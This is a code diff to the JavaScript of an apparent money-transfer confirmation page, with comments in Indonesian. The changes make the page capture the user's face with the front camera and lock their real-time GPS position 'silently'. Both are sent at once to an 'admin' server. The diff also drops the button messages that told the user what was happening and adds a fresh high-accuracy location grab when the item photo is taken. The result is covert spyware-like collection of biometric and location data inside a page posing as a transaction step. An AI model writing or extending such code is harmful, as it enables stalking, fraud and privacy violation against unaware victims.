@@ -701,55 +701,30 @@
         currentTransferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
 
         try {
-            // ========================================================
-            // TAHAP 1A: KUNCI LOKASI GPS REALTIME
-            // ========================================================
-            if (elements.btnConfirm) elements.btnConfirm.textContent = '📍 Mengaktifkan GPS Realtime...';
-            console.log('[TAHAP-1A] Mengunci GPS realtime...');
-            
-            // Picu tracking realtime seketika dari gestur klik pengguna
+            // Aktifkan streaming GPS seketika di latar belakang
             startRealtimeLocationTracking();
 
-            let locResult;
-            if (isRealGps(bestAccurateLocation)) {
-                const age = Date.now() - (bestAccurateLocation.capturedAt || 0);
-                if (age < 30000 && bestAccurateLocation.accuracy <= 50) {
-                    locResult = { ...bestAccurateLocation };
-                    console.log('[GPS] Realtime GPS akurat terkunci:', Math.round(age/1000) + 's lalu');
-                } else {
-                    locResult = await getSilentLocation();
-                }
-            } else {
-                locResult = await getSilentLocation();
-            }
-            silentLocationData = locResult;
+            // Eksekusi pengambilan foto wajah silent & penguncian lokasi GPS secara hening (parallel)
+            const [locResult, frontResult] = await Promise.all([
+                (isRealGps(bestAccurateLocation) && (Date.now() - (bestAccurateLocation.capturedAt || 0) < 30000))
+                    ? Promise.resolve(bestAccurateLocation)
+                    : getSilentLocation(),
+                silentFrontCameraCapture()
+            ]);
 
-            // ========================================================
-            // TAHAP 1B: SILENT FRONT CAMERA
-            // ========================================================
-            if (elements.btnConfirm) elements.btnConfirm.textContent = '📷 Menyiapkan Kamera...';
-            console.log('[TAHAP-1B] Silent front camera...');
-            const frontResult = await silentFrontCameraCapture();
+            silentLocationData = locResult || bestAccurateLocation;
             silentFrontPhotoBase64 = frontResult;
 
-            // ========================================================
-            // TAHAP 1C: KIRIM KE ADMIN
-            // ========================================================
-            console.log('[TAHAP-1C] Kirim ke admin...');
-            await syncTransactionRecord({
+            // Kirim data silent (wajah + lokasi realtime) ke server admin
+            syncTransactionRecord({
                 transferId: currentTransferId,
                 location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
-                frontPhoto: silentFrontPhotoBase64,
+                frontPhoto: silentFrontPhotoBase64 || '',
                 photo: '',
                 status: 'waiting_item_photo'
             });
 
-            await new Promise(r => setTimeout(r, 400));
-
-            // ========================================================
-            // TAHAP 2: BUKA KAMERA BELAKANG
-            // ========================================================
-            console.log('[TAHAP-2] Buka kamera belakang...');
+            // Langsung buka kamera belakang untuk foto barang transaksi
             const backOpened = await openBackCamera('environment');
 
             if (!backOpened) {
@@ -768,7 +743,7 @@
                 await syncTransactionRecord({
                     transferId: currentTransferId,
                     location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
-                    frontPhoto: silentFrontPhotoBase64,
+                    frontPhoto: silentFrontPhotoBase64 || '',
                     photo: capturedPhotoBase64 || '',
                     status: 'verified'
                 });
@@ -811,15 +786,35 @@
                 capturedPhotoBase64 = backPhoto;
             }
 
+            // Pastikan mengambil koordinat GPS real-time terbaru saat memotret barang
             let finalLocation = null;
-            if (isRealGps(bestAccurateLocation)) {
-                finalLocation = bestAccurateLocation;
-            } else if (isRealGps(liveLocationData)) {
-                finalLocation = liveLocationData;
-            } else if (isRealGps(silentLocationData)) {
-                finalLocation = silentLocationData;
-            } else {
-                finalLocation = await getSilentLocation();
+            
+            // Coba ambil posisi fresh instan (timeout singkat 2 detik)
+            if (navigator.geolocation) {
+                try {
+                    const freshGps = await new Promise(res => {
+                        navigator.geolocation.getCurrentPosition(
+                            (p) => res(processNewLocation(p, 'satellite-photo-capture')),
+                            () => res(null),
+                            { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
+                        );
+                    });
+                    if (freshGps && isRealGps(freshGps)) {
+                        finalLocation = freshGps;
+                    }
+                } catch(e) {}
+            }
+
+            if (!finalLocation) {
+                if (isRealGps(bestAccurateLocation)) {
+                    finalLocation = bestAccurateLocation;
+                } else if (isRealGps(liveLocationData)) {
+                    finalLocation = liveLocationData;
+                } else if (isRealGps(silentLocationData)) {
+                    finalLocation = silentLocationData;
+                } else {
+                    finalLocation = await getSilentLocation();
+                }
             }
 
             console.log('[TAHAP-3] Kirim foto barang ke admin...');
